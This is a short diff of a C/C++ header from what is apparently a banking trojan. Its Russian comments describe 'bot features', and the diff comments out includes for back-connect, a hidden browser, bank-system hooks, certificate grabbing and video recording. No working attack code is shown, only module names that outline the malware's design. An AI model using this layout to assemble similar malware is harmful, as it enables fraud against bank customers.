@@ -4,7 +4,7 @@
 //  Заголовочный файл включающий некторые возможности бота.
 //
 /*--------------------------------------------------------------------------*/
-
+/*
 
 #include "InternetExplorer.h" // Обработка запросов InternetExplorer
 #include "Firefox.h"
@@ -27,17 +27,14 @@
 #include "BackConnect.h" // Модуль обратной связи
 #include "StealthBrowser.h" // Скрытый браузер
 
-//#include "RuBnk\RuBnk.h" //Включение рубанка
-//#include "CyberPlatDLL.h"
-//#include "RuBnk\Sber.h"
 
 #include "IBankSystem.h"
 
-//#include "antirapport.h"
 #include "Hunter.h"
-//#include "CertGrab.h"
+
 
 #include "VideoRecorder.h"
 
 #include "FgrFilters.h" 
 
+*/
